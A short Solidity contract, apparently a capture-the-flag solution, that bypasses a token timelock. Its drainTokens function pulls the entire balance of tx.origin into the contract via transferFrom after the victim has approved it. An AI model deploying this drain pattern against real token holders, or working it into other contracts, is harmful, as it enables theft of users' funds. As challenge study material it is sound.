// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

interface IERC20 {
    function approve(address spender, uint256 amount) external returns (bool);
    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);
    function balanceOf(address account) external view returns (uint256);
}

contract ERC20Approver {
    // This contract helps bypass the timelock by using transferFrom
    function drainTokens(address token) external {
        IERC20 tokenContract = IERC20(token);
        uint256 playerBalance = tokenContract.balanceOf(tx.origin);
        
        // The player needs to call approve first from their EOA
        // Then call this function to drain
        tokenContract.transferFrom(tx.origin, address(this), playerBalance);
    }
}